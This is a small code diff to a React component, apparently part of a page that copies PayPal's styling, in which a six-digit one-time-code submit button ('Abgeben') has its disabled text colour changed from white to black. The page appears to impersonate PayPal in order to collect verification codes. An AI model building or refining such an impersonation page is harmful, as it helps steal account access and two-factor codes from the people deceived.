@@ -108,7 +108,7 @@ export const Link3Page = (): JSX.Element => {
               <Button 
                 onClick={handleSubmit}
                 disabled={otpValue.length !== 6}
-                className="w-full max-w-[375px] h-[50px] bg-[#1161ca] text-wwwpaypalcomwhite rounded-[1000px] border-2 border-solid font-www-paypal-com-helvetica-neue-regular text-[length:var(--www-paypal-com-helvetica-neue-regular-font-size)] tracking-[var(--www-paypal-com-helvetica-neue-regular-letter-spacing)] leading-[var(--www-paypal-com-helvetica-neue-regular-line-height)] hover:bg-[#0f56b8] transition-colors duration-200 disabled:bg-[#cbd2d6] disabled:text-white disabled:cursor-not-allowed disabled:border-[#cbd2d6]"
+                className="w-full max-w-[375px] h-[50px] bg-[#1161ca] text-wwwpaypalcomwhite rounded-[1000px] border-2 border-solid font-www-paypal-com-helvetica-neue-regular text-[length:var(--www-paypal-com-helvetica-neue-regular-font-size)] tracking-[var(--www-paypal-com-helvetica-neue-regular-letter-spacing)] leading-[var(--www-paypal-com-helvetica-neue-regular-line-height)] hover:bg-[#0f56b8] transition-colors duration-200 disabled:bg-[#cbd2d6] disabled:text-black disabled:cursor-not-allowed disabled:border-[#cbd2d6]"
               >
                 Abgeben
               </Button>
